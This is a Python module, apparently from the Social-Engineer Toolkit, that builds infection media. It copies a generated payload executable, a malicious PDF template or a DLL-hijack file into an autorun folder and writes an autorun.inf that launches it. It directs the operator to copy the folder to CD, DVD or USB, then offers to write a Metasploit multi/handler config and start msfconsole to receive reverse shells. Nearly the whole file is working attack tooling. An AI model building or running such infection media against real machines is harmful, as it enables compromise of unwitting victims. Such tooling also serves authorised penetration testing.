#!/usr/bin/env python
# coding=utf-8
# simple autorun creation for set

import os
import subprocess
from time import sleep

import src.core.setcore as core

# define metasploit path
definepath = os.getcwd()
msf_path = core.meta_path()
me = core.mod_name()
autorun_path = os.path.join(core.userconfigpath, "autorun")

trigger = 0

if core.check_options("INFECTION_MEDIA=") == "ON":
    trigger = 1
    subprocess.Popen("rm -rf {0} 1> /dev/null 2> /dev/null;"
                     "mkdir {0} 1> /dev/null 2> /dev/null;"
                     "cp {1} {2} 1> /dev/null 2> /dev/null".format(autorun_path,
                                                                   os.path.join(core.userconfigpath, "payload.exe"),
                                                                   os.path.join(autorun_path, "program.exe")),
                     shell=True).wait()

if os.path.isfile(os.path.join(core.userconfigpath, "fileformat.file")):
    trigger = 2
    subprocess.Popen("rm -rf {0} 1> /dev/null 2> /dev/null;"
                     "mkdir {0} 1> /dev/null 2> /dev/null;"
                     "cp {1} {0} 1> /dev/null 2>/dev/null".format(autorun_path,
                                                                  os.path.join(core.userconfigpath, "template.pdf")),
                     shell=True).wait()

if os.path.isfile(os.path.join(core.userconfigpath, "dll/openthis.wab")):
    subprocess.Popen("rm -rf {0} 1> /dev/null 2> /dev/null;"
                     "mkdir {0} 1> /dev/null 2> /dev/null;"
                     "cp {1} {0} 1> /dev/null 2> /dev/null".format(autorun_path,
                                                                   os.path.join(core.userconfigpath, "dll/*")),
                     shell=True).wait()
    trigger = 3

if not os.path.isdir(autorun_path):
    os.makedirs(autorun_path)

with open(os.path.join(autorun_path, "autorun.inf"), 'w') as filewrite:
    # if using standard payloads
    if trigger == 1:
        payload = "program.exe"  # "" + alpha_data + "\""

    # if using pdf payload
    elif trigger == 2:
        payload = "template.pdf"

    elif trigger == 3:
        payload = "openthis.wab"

    else:
        payload = ""

    filewrite.write("""[autorun]\nopen={0}\nicon=autorun.ico""".format(payload))

core.print_status("Your attack has been created in the SET home directory (/root/.set/) folder 'autorun'")
core.print_status("Note a backup copy of template.pdf is also in /root/.set/template.pdf if needed.")
core.print_info("Copy the contents of the folder to a CD/DVD/USB to autorun")

# if we want to launch payload and automatically create listener
if trigger in [1, 2, 3]:
    choice1 = core.yesno_prompt("0", "Create a listener right now [yes|no]")
    if choice1.lower() == "yes" or choice1.lower() == "y":
        # if we used something to create other than solo.py then write out the
        # listener
        if not os.path.isfile(os.path.join(core.userconfigpath, "meta_config")):
            with open(os.path.join(core.userconfigpath, "meta_config"), 'w') as filewrite, \
                    open(os.path.join(core.userconfigpath, "payload.options")) as fileopen:
                for line in fileopen:
                    line = line.split(" ")
                    filewrite.write("use multi/handler\n")
                    filewrite.write("set payload {0}\n".format(line[0]))
                    filewrite.write("set lhost {0}\n".format(line[1]))
                    filewrite.write("set lport {0}\n".format(line[2]))
                    filewrite.write("set ExitOnSession false\n")
                    filewrite.write("exploit -j\r\n\r\n")

        # create the listener
        core.print_status("Launching Metasploit.. This could take a few. Be patient! Or else no shells for you..")
        subprocess.Popen("{0} -r {1}".format(os.path.join(msf_path, "msfconsole"),
                                           os.path.join(core.userconfigpath, "meta_config")),
                         shell=True).wait()
    else:
        core.print_warning("cancelling...")
        sleep(2)
